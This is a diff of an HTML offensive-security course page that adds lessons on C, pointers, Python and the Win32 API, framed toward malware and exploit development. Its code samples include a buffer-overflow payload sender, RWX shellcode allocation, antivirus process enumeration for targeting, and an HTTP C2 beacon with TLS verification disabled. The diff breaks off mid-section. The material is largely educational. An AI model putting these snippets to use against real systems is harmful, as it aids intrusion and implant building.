@@ -12,6 +12,9 @@
             --accent2: #00ff88;
             --dim: #666;
             --border: #333;
+            --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -22,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -32,10 +36,25 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .code-block.c { border-left-color: #5555ff; }
         .code-block.python { border-left-color: #ffaa00; }
         .code-block.ps { border-left-color: var(--accent2); }
+        .code-block.asm { border-left-color: var(--purple); }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -130,6 +149,125 @@
             padding: 2rem;
             margin: 2rem 0;
         }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .warning-box {
+            background: #2a0a0a;
+            border: 2px solid #ff5555;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+        .why-box {
+            background: #1a1a0a;
+            border-left: 4px solid #ffaa00;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .why-box h5 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .step-box {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        .memory-diagram {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+        .memory-segment {
+            padding: 0.3rem 0.8rem;
+            margin: 0.2rem 0;
+            border-radius: 4px;
+        }
+        .segment-stack { background: #1a0a1a; border-left: 3px solid var(--purple); }
+        .segment-heap { background: #0a1a0a; border-left: 3px solid var(--accent2); }
+        .segment-data { background: #1a1a0a; border-left: 3px solid var(--amber); }
+        .segment-text { background: #0a0a1a; border-left: 3px solid #5555ff; }
+        .segment-rodata { background: #1a1a1a; border-left: 3px solid var(--neon); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
     </style>
 </head>
 <body>
@@ -162,10 +300,922 @@
             </ul>
         </div>
 
-        <h2>Three Languages, Same Goal: List Running Processes</h2>
+        <h2>Section 1: Programming Fundamentals</h2>
+        
+        <h3>1.1 What is a Program?</h3>
+        <p>A program is a sequence of instructions that tells a computer what to do. At the lowest level, these instructions are binary opcodes executed by the CPU. At the highest level, they are human-readable statements in languages like Python or C.</p>
+        
+        <div class="step-box">
+            <h4>🧱 The Abstraction Stack</h4>
+            <div class="memory-diagram">
+                <div class="memory-segment segment-stack">High-Level: Python, C#, JavaScript (human-readable)</div>
+                <div class="memory-segment segment-heap">Intermediate: C, C++, Rust (compiled to machine code)</div>
+                <div class="memory-segment segment-data">Low-Level: Assembly (mnemonics for opcodes)</div>
+                <div class="memory-segment segment-text">Bare Metal: Machine Code (0x48 0x89 0xC3 ...)</div>
+                <div class="memory-segment segment-rodata">Hardware: Micro-ops inside the CPU</div>
+            </div>
+        </div>
+
+        <h3>1.2 Data Types: The Building Blocks</h3>
+        <p>Data types define how bits are interpreted. The same binary pattern <span class="neon-highlight">0x41414141</span> can be:</p>
+        <ul style="margin-left: 1.5rem; line-height: 2;">
+            <li>An unsigned 32-bit integer: <span class="neon-amber">1,094,795,585</span></li>
+            <li>A signed 32-bit integer: <span class="neon-amber">1,094,795,585</span> (positive, MSB=0)</li>
+            <li>Four ASCII characters: <span class="neon-amber">"AAAA"</span></li>
+            <li>A memory address on 32-bit systems: <span class="neon-amber">0x41414141</span></li>
+            <li>Four bytes in a network packet</li>
+        </ul>
+
+        <table class="comparison-table">
+            <tr>
+                <th>Type</th>
+                <th>C Declaration</th>
+                <th>Size (x64)</th>
+                <th>Range / Purpose</th>
+            </tr>
+            <tr>
+                <td><span class="neon-highlight">char</span></td>
+                <td><code>char c;</code></td>
+                <td>1 byte</td>
+                <td>-128 to 127 (ASCII/small integers)</td>
+            </tr>
+            <tr>
+                <td><span class="neon-highlight">short</span></td>
+                <td><code>short s;</code></td>
+                <td>2 bytes</td>
+                <td>-32,768 to 32,767</td>
+            </tr>
+            <tr>
+                <td><span class="neon-highlight">int</span></td>
+                <td><code>int i;</code></td>
+                <td>4 bytes</td>
+                <td>~±2 billion (default integer)</td>
+            </tr>
+            <tr>
+                <td><span class="neon-highlight">long</span></td>
+                <td><code>long l;</code></td>
+                <td>4 bytes (Win), 8 (Linux)</td>
+                <td>Platform-dependent</td>
+            </tr>
+            <tr>
+                <td><span class="neon-highlight">long long</span></td>
+                <td><code>long long ll;</code></td>
+                <td>8 bytes</td>
+                <td>~±9 quintillion</td>
+            </tr>
+            <tr>
+                <td><span class="neon-highlight">float</span></td>
+                <td><code>float f;</code></td>
+                <td>4 bytes</td>
+                <td>IEEE 754 single precision</td>
+            </tr>
+            <tr>
+                <td><span class="neon-highlight">double</span></td>
+                <td><code>double d;</code></td>
+                <td>8 bytes</td>
+                <td>IEEE 754 double precision</td>
+            </tr>
+            <tr>
+                <td><span class="neon-highlight">pointer</span></td>
+                <td><code>void* p;</code></td>
+                <td>4 (x86) / 8 (x64)</td>
+                <td>Memory address</td>
+            </tr>
+            <tr>
+                <td><span class="neon-highlight">size_t</span></td>
+                <td><code>size_t sz;</code></td>
+                <td>4 (x86) / 8 (x64)</td>
+                <td>Unsigned, for sizes/offsets</td>
+            </tr>
+        </table>
+
+        <div class="warning-box">
+            <h5>⚠️ Security Implication: Integer Overflow</h5>
+            <p>What happens when <code>unsigned int x = 0xFFFFFFFF; x++;</code>? It wraps to 0. In security-critical code (e.g., memory allocation size checks), this can lead to heap overflows or under-allocations. Always validate bounds before arithmetic.</p>
+        </div>
+
+        <h3>1.3 Variables and Memory</h3>
+        <p>A variable is a named location in memory. In C, you must declare the type so the compiler knows how many bytes to reserve and how to interpret them.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+// Declaring variables
+int count = 42;           // 4 bytes on stack, value 42
+char flag = 1;            // 1 byte, value 1 (true)
+double pi = 3.14159;      // 8 bytes, floating point
+void* buffer = NULL;      // 8 bytes (x64), points to nothing
+
+// Memory layout on x64 stack:
+// &count  ->  0x7ffd...  [2A 00 00 00]  (little-endian)
+// &flag   ->  0x7ffd...  [01]
+// &pi     ->  0x7ffd...  [6E 86 1B F0 F9 21 09 40]  (IEEE 754)
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 What Just Happened?</h4>
+            <p>Each variable is a box in memory with a label (name), size (type), and contents (value). The <span class="neon-highlight">&amp;</span> operator gives you the box's address. The <span class="neon-highlight">*</span> operator (in pointer context) opens the box at a given address.</p>
+        </div>
+
+        <h2>Section 2: C Basics for Security</h2>
+
+        <h3>2.1 Hello, Kernel</h3>
+        <p>C is the lingua franca of systems programming. Operating systems, drivers, and security tools are written in C because it provides direct memory access with minimal runtime overhead.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+// The simplest C program: entry point, do work, exit
+int main(int argc, char* argv[]) {
+    // argc = argument count, argv = argument vector (array of strings)
+    printf("Hello from PID %lu\n", GetCurrentProcessId());
+    
+    for (int i = 0; i < argc; i++) {
+        printf("Arg[%d]: %s\n", i, argv[i]);
+    }
+    
+    return 0;  // Exit code: 0 = success
+}
+        </div>
+
+        <h3>2.2 Control Flow: Decisions and Loops</h3>
+        <p>Control flow determines which code executes and how many times. Understanding this is critical for analyzing malware, which often uses obfuscated control flow to hide its logic.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;stdio.h&gt;
+#include &lt;stdbool.h&gt;
+
+// if/else: binary decisions
+bool is_elevated() {
+    // Simplified: check if running as admin
+    // Real implementation uses OpenProcessToken + GetTokenInformation
+    return false;  // placeholder
+}
+
+// switch: multi-way branch (jump table in assembly)
+void handle_command(int cmd) {
+    switch (cmd) {
+        case 0x01:  // CMD_SHELL
+            printf("Spawning shell...\n");
+            break;
+        case 0x02:  // CMD_UPLOAD
+            printf("Uploading file...\n");
+            break;
+        case 0x03:  // CMD_DOWNLOAD
+            printf("Downloading file...\n");
+            break;
+        default:
+            printf("Unknown command: 0x%02X\n", cmd);
+    }
+}
+
+// for loop: counted iteration
+void scan_ports(const char* target, int start, int end) {
+    for (int port = start; port <= end; port++) {
+        printf("Scanning %s:%d\n", target, port);
+        // connect() logic here...
+    }
+}
+
+// while loop: condition-based
+void wait_for_signal(volatile bool* signal) {
+    while (!*signal) {
+        Sleep(100);  // polling loop — common in implants
+    }
+    printf("Signal received!\n");
+}
+        </div>
+
+        <div class="why-box">
+            <h5>💡 Why This Matters for Security</h5>
+            <p>Malware often replaces <code>if</code> statements with <span class="neon-amber">opaque predicates</span> (always-true/false conditions) to confuse disassemblers. Understanding normal control flow helps you spot obfuscation.</p>
+        </div>
+
+        <h3>2.3 Functions: Reusable Code Blocks</h3>
+        <p>Functions encapsulate logic. They have a calling convention (who cleans up the stack), a return type, and parameters. In x64 Windows, the first four integer arguments are passed in registers: <span class="neon-highlight">RCX, RDX, R8, R9</span>.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// Function prototype: declares signature before use
+DWORD get_process_pid(const wchar_t* processName);
+BOOL inject_shellcode(DWORD pid, const BYTE* shellcode, SIZE_T size);
+
+// Definition: actual implementation
+DWORD get_process_pid(const wchar_t* processName) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return 0;
+    
+    PROCESSENTRY32W pe = { .dwSize = sizeof(PROCESSENTRY32W) };
+    DWORD pid = 0;
+    
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, processName) == 0) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(hSnap, &pe));
+    }
+    
+    CloseHandle(hSnap);
+    return pid;
+}
+
+// Calling convention matters:
+// __cdecl   = caller cleans stack (C default)
+// __stdcall = callee cleans stack (Windows API)
+// __fastcall = first args in registers (optimization)
+        </div>
+
+        <h2>Section 3: Pointers and Memory</h2>
+
+        <h3>3.1 Pointers: The Heart of C</h3>
+        <p>A pointer stores a memory address. They are the most powerful and dangerous feature of C. Master pointers, and you master memory manipulation — essential for exploit development, reverse engineering, and shellcode.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;stdio.h&gt;
+
+void pointer_basics() {
+    int value = 0x1337;
+    int* ptr = &value;      // ptr holds the address of value
+    
+    printf("value  = 0x%X\n", value);       // 0x1337
+    printf("&value = %p\n", (void*)&value);  // address of value
+    printf("ptr    = %p\n", (void*)ptr);     // same address
+    printf("*ptr   = 0x%X\n", *ptr);         // dereference: 0x1337
+    
+    *ptr = 0xDEAD;          // write through pointer
+    printf("value  = 0x%X\n", value);       // 0xDEAD (modified!)
+    
+    // Pointer arithmetic: +1 adds sizeof(type), not 1 byte
+    int arr[4] = {0x10, 0x20, 0x30, 0x40};
+    int* p = arr;
+    printf("p[0]=0x%X, p[1]=0x%X\n", *p, *(p+1));  // 0x10, 0x20
+    printf("p+1  = %p\n", (void*)(p+1));           // +4 bytes (sizeof(int))
+}
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Pointer Analogy</h4>
+            <p>A pointer is like a house address. The address itself is just a number (e.g., 742 Evergreen Terrace). The <span class="neon-highlight">*</span> operator is like going to that address and opening the door. Pointer arithmetic is like saying "the next house" — but the distance depends on house size (type).</p>
+        </div>
+
+        <h3>3.2 Stack vs Heap</h3>
+        <p>Memory is divided into segments. The two you allocate from are the <span class="neon-highlight">stack</span> (automatic, scoped) and <span class="neon-highlight">heap</span> (manual, persistent).</p>
+
+        <div class="memory-diagram">
+            <div class="memory-segment segment-stack">Stack (grows down) — local variables, function frames, return addresses</div>
+            <div class="memory-segment segment-heap">Heap (grows up) — malloc/calloc/VirtualAlloc, persistent until freed</div>
+            <div class="memory-segment segment-data">Data — global/static variables, initialized at compile time</div>
+            <div class="memory-segment segment-text">Text/Code — machine instructions, read-only</div>
+            <div class="memory-segment segment-rodata">ROData — read-only strings and constants</div>
+        </div>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+
+void memory_example() {
+    // STACK: automatic, fast, limited size (~1MB default)
+    int stack_arr[1024];           // 4KB on stack
+    char stack_buf[256];           // 256 bytes, freed when function returns
+    
+    // HEAP: manual, larger, slower, must free
+    int* heap_arr = (int*)malloc(1024 * sizeof(int));  // 4KB on heap
+    if (!heap_arr) return;         // ALWAYS check malloc return
+    
+    BYTE* big_buf = (BYTE*)VirtualAlloc(
+        NULL,                      // let system choose address
+        4096,                      // size: 1 page
+        MEM_COMMIT | MEM_RESERVE,  // allocate physical backing
+        PAGE_EXECUTE_READWRITE     // RWX — needed for shellcode
+    );
+    if (!big_buf) {
+        free(heap_arr);
+        return;
+    }
+    
+    // Use memory...
+    memcpy(big_buf, "\x90\x90\x90\x90", 4);  // NOP sled
+    
+    // CLEAN UP: heap allocations persist until freed
+    free(heap_arr);                // release malloc'd memory
+    VirtualFree(big_buf, 0, MEM_RELEASE);  // release VirtualAlloc'd memory
+}
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Common Bug: Use-After-Free</h5>
+            <p>After <code>free(ptr)</code>, <code>ptr</code> still holds the old address — a <span class="neon-amber">dangling pointer</span>. Dereferencing it is undefined behavior. In exploits, use-after-free is a powerful primitive for arbitrary code execution. See <a class="cross-link" href="MODULE_06_MEMORY.html">Module 06: Memory Corruption</a> for exploitation techniques.</p>
+        </div>
+
+        <h3>3.3 Arrays and Strings</h3>
+        <p>Arrays are contiguous blocks of elements. C strings are null-terminated byte arrays. This simple design is the root of countless vulnerabilities.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+
+// Arrays: contiguous memory
+void array_demo() {
+    int nums[5] = {10, 20, 30, 40, 50};
+    // Memory layout: [0A 00 00 00][14 00 00 00][1E 00 00 00]...
+    //                nums[0]     nums[1]       nums[2]
+    
+    printf("nums[2] = %d\n", nums[2]);     // 30
+    printf("*(nums+2) = %d\n", *(nums+2)); // same thing: pointer arithmetic
+}
+
+// Strings: null-terminated char arrays
+// THE source of buffer overflows since 1972
+void string_danger() {
+    char buf[16];
+    char* input = get_user_input();  // "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    
+    strcpy(buf, input);   // DANGER: copies until '\0', no size check
+    // If input > 15 chars, overflow into adjacent memory (stack canary, return address, etc.)
+    
+    // SAFE alternatives:
+    strncpy(buf, input, sizeof(buf) - 1);  // copy at most 15 chars
+    buf[sizeof(buf) - 1] = '\0';           // ensure null termination
+    
+    // Even better: strlcpy (BSD), strcpy_s (MSVC), or manual bounds checking
+}
+        </div>
+
+        <h2>Section 4: Python for Security</h2>
+
+        <h3>4.1 Why Python?</h3>
+        <p>Python is the dominant language in cybersecurity tooling. Its strength is rapid development and a massive ecosystem. Its weakness is performance and distribution — you need the interpreter or must bundle it.</p>
+
+        <div class="code-block python">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+import socket
+import struct
+import sys
+
+# Python is dynamically typed: types are inferred at runtime
+# This is convenient but slower than C's static types
+
+def exploit_buffer_overflow(target_ip: str, target_port: int) -> None:
+    """
+    Build a simple buffer overflow payload.
+    In real scenarios, you'd calculate offsets with pattern_create.
+    """
+    offset = 260                     # bytes until return address overwrite
+    jmp_esp = struct.pack("<I", 0x625011AF)  # little-endian address
+    
+    # NOP sled + shellcode + padding + return address
+    payload = b"\x90" * 16           # NOP sled for landing zone
+    payload += b"\x31\xc0\x50\x68..."  # shellcode (truncated)
+    payload += b"A" * (offset - len(payload))  # padding
+    payload += jmp_esp               # overwrite return address
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5)
+    try:
+        sock.connect((target_ip, target_port))
+        sock.recv(1024)              # receive banner
+        sock.send(payload + b"\n")
+        print(f"[+] Payload sent to {target_ip}:{target_port}")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    finally:
+        sock.close()
+
+# Python's ctypes module lets you call C functions directly
+from ctypes import *
+
+kernel32 = WinDLL("kernel32")
+VirtualAlloc = kernel32.VirtualAlloc
+VirtualAlloc.argtypes = [c_void_p, c_size_t, c_uint32, c_uint32]
+VirtualAlloc.restype = c_void_p
+
+# Allocate RWX memory from Python
+addr = VirtualAlloc(0, 4096, 0x1000 | 0x2000, 0x40)  # MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
+print(f"[+] Allocated RWX memory at 0x{addr:016X}")
+        </div>
+
+        <h3>4.2 Python for Reconnaissance</h3>
+        <div class="code-block python">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+import subprocess
+import re
+import json
+from pathlib import Path
+
+def enum_system_info() -> dict:
+    """Gather system information for targeting decisions."""
+    info = {}
+    
+    # Execute system commands and parse output
+    try:
+        # Windows: systeminfo
+        result = subprocess.run(
+            ["systeminfo"], capture_output=True, text=True, timeout=30
+        )
+        
+        # Extract OS name and hotfixes
+        info["os"] = re.search(r"OS Name:\s+(.+)", result.stdout)
+        info["hotfixes"] = re.findall(r"\[\d+\]:\s+(.+)", result.stdout)
+        
+        # Check for common AV processes
+        tasklist = subprocess.run(
+            ["tasklist", "/FO", "CSV"], capture_output=True, text=True
+        )
+        av_processes = ["MsMpEng.exe", "avp.exe", "ccsvchst.exe"]
+        info["av_detected"] = [
+            av for av in av_processes 
+            if av in tasklist.stdout
+        ]
+        
+    except Exception as e:
+        info["error"] = str(e)
+    
+    return info
+
+# Python's requests library for HTTP-based C2
+import requests
+
+def beacon_c2(server: str, data: dict) -> bytes:
+    """Simple beacon to C2 server with JSON data."""
+    try:
+        resp = requests.post(
+            f"https://{server}/beacon",
+            json=data,
+            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0)"},
+            timeout=10,
+            verify=False  # ignore SSL cert (common in malware)
+        )
+        return resp.content
+    except requests.RequestException:
+        return b""
+        </div>
+
+        <h2>Section 5: Windows API Basics</h2>
+
+        <h3>5.1 The Windows API (Win32)</h3>
+        <p>The Windows API is a C-based interface to the Windows kernel. Every Windows program — from Notepad to malware — uses these functions. Learning Win32 is essential for understanding how Windows works under the hood.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// Core Win32 concepts:
+// HANDLE = opaque pointer to kernel object (process, thread, file, etc.)
+// DWORD  = 32-bit unsigned int (Double Word)
+// LPVOID = void* (Long Pointer to VOID — legacy naming)
+// HRESULT = error/success code (0 = S_OK, negative = error)
+
+void win32_basics() {
+    // Get current process pseudo-handle (-1)
+    HANDLE hSelf = GetCurrentProcess();
+    
+    // Get process ID
+    DWORD pid = GetCurrentProcessId();
+    
+    // Get module handle (HINSTANCE) of current executable
+    HMODULE hMod = GetModuleHandle(NULL);
+    
+    // Get command line as single string
+    LPSTR cmdLine = GetCommandLineA();
+    
+    // Get last error code (MUST call immediately after failure)
+    HANDLE hBad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 99999);
+    if (!hBad) {
+        DWORD err = GetLastError();  // 87 = ERROR_INVALID_PARAMETER
+        printf("OpenProcess failed: %lu\n", err);
+    }
+    
+    // Common error codes to memorize:
+    // 5   = ERROR_ACCESS_DENIED
+    // 87  = ERROR_INVALID_PARAMETER
+    // 998 = ERROR_NOACCESS (bad pointer)
+    // 122 = ERROR_INSUFFICIENT_BUFFER
+}
+        </div>
+
+        <h3>5.2 Process and Thread Management</h3>
+        <p>Understanding processes and threads is fundamental to injection, debugging, and evasion. These are the primitives you'll manipulate in <a class="cross-link" href="MODULE_10_CODE_INJECTION.html">Module 10: Code Injection</a>.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;stdio.h&gt;
+
+// Open a process by PID with specific access rights
+HANDLE open_target(DWORD pid) {
+    // PROCESS_VM_READ    = read memory
+    // PROCESS_VM_WRITE   = write memory
+    // PROCESS_VM_OPERATION = VirtualAllocEx, VirtualProtectEx
+    // PROCESS_CREATE_THREAD = CreateRemoteThread
+    // PROCESS_ALL_ACCESS = everything (requires admin usually)
+    
+    HANDLE hProc = OpenProcess(
+        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+        FALSE,  // don't inherit handle
+        pid
+    );
+    return hProc;  // NULL on failure, check GetLastError()
+}
+
+// Enumerate threads in a process
+void list_threads(DWORD pid) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+    
+    THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
+    
+    if (Thread32First(hSnap, &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                printf("TID: %lu | Priority: %ld\n", 
+                       te.th32ThreadID, te.tpBasePri);
+            }
+        } while (Thread32Next(hSnap, &te));
+    }
+    CloseHandle(hSnap);
+}
+        </div>
+
+        <h3>5.3 Memory Management APIs</h3>
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+void memory_apis() {
+    // VirtualAlloc: allocate private memory in current process
+    LPVOID mem = VirtualAlloc(
+        NULL,           // let system choose address
+        4096,           // size in bytes
+        MEM_COMMIT | MEM_RESERVE,  // commit physical pages + reserve range
+        PAGE_READWRITE  // RW (no execute — DEP friendly)
+    );
+    
+    if (mem) {
+        // Write data
+        strcpy((char*)mem, "Hello from allocated memory");
+        
+        // Change protection to RX (read + execute) for shellcode
+        DWORD oldProtect;
+        VirtualProtect(mem, 4096, PAGE_EXECUTE_READ, &oldProtect);
+        
+        // Free when done
+        VirtualFree(mem, 0, MEM_RELEASE);
+    }
+    
+    // VirtualAllocEx: allocate memory in ANOTHER process
+    // Used in DLL injection and shellcode injection
+    // See Module 10 for full injection code
+}
+        </div>
+
+        <div class="cross-link" style="display:block; margin:1rem 0;">
+            🔗 Continue to <a href="MODULE_10_CODE_INJECTION.html">Module 10: Code Injection</a> for full injection techniques using these APIs.
+        </div>
+
+        <h2>Section 6: Error Handling</h2>
+
+        <h3>6.1 C Error Handling Patterns</h3>
+        <p>C has no exceptions. Errors are signaled through return values and the global <code>errno</code> / <code>GetLastError()</code> mechanism. You must check every API call.</p>
+
+        <div class="code-block c">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// Pattern 1: Check return value
+BOOL safe_open_file(const wchar_t* path) {
+    HANDLE hFile = CreateFileW(
+        path,
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DWORD err = GetLastError();
+        printf("CreateFile failed: %lu\n", err);
+        // 2 = ERROR_FILE_NOT_FOUND, 5 = ERROR_ACCESS_DENIED
+        return FALSE;
+    }
+    
+    // Use file...
+    CloseHandle(hFile);
+    return TRUE;
+}
+
+// Pattern 2: goto cleanup (common in kernel/driver code)
+BOOL complex_operation() {
+    BOOL result = FALSE;
+    HANDLE h1 = NULL, h2 = NULL;
+    LPVOID buf = NULL;
+    
+    h1 = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 1234);
+    if (!h1) goto cleanup;
+    
+    h2 = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 4096, NULL);
+    if (!h2) goto cleanup;
+    
+    buf = MapViewOfFile(h2, FILE_MAP_ALL_ACCESS, 0, 0, 4096);
+    if (!buf) goto cleanup;
+    
+    // ... do work ...
+    result = TRUE;
+    
+cleanup:
+    if (buf) UnmapViewOfFile(buf);
+    if (h2) CloseHandle(h2);
+    if (h1) CloseHandle(h1);
+    return result;
+}
+        </div>
+
+        <h3>6.2 Python Error Handling</h3>
+        <div class="code-block python">
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+import ctypes
+from ctypes import wintypes
+
+# Python uses exceptions for error handling
+try:
+    # Attempt to open a privileged process
+    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    hProc = kernel32.OpenProcess(
+        0x1F0FFF,  # PROCESS_ALL_ACCESS
+        False,
+        4          # System PID (usually protected)
+    )
+    if not hProc:
+        err = ctypes.get_last_error()
+        raise ctypes.WinError(err)  # raises WindowsError with message
+    
+    # Use handle...
+    kernel32.CloseHandle(hProc)
+    
+except PermissionError as e:
+    print(f"Access denied: {e}")
+except OSError as e:
+    print(f"OS error: {e.winerror} - {e.strerror}")
+except Exception as e:
+    print(f"Unexpected: {e}")
+finally:
+    # Always runs — use for cleanup
+    print("Cleanup complete")
+        </div>
+
+        <h2>Section 7: The Compilation Process</h2>
+
+        <h3>7.1 From Source to Binary</h3>
+        <p>Understanding compilation helps you analyze binaries, write position-independent code, and debug effectively. The process has four stages:</p>
+
+        <div class="step-box">
+            <h4>1. Preprocessing</h4>
+            <p>Handles <code>#include</code>, <code>#define</code>, macros. Produces expanded <code>.i</code> file.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+cl.exe /P source.c      # output: source.i (preprocessed)
+gcc -E source.c > out.i
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>2. Compilation</h4>
+            <p>Translates C to assembly. Produces <code>.asm</code> or <code>.s</code> file.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+cl.exe /Fa source.c     # output: source.asm
+gcc -S source.c         # output: source.s
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>3. Assembly</h4>
+            <p>Assembles mnemonics into machine code (object file <code>.obj</code> or <code>.o</code>).</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+ml64.exe source.asm     # output: source.obj
+gcc -c source.s         # output: source.o
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>4. Linking</h4>
+            <p>Combines object files, resolves symbols, produces executable <code>.exe</code> or <code>.dll</code>.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+link.exe source.obj /OUT:program.exe /SUBSYSTEM:CONSOLE
+gcc source.o -o program
+            </div>
+        </div>
+
+        <h3>7.2 Compiler Flags for Security Research</h3>
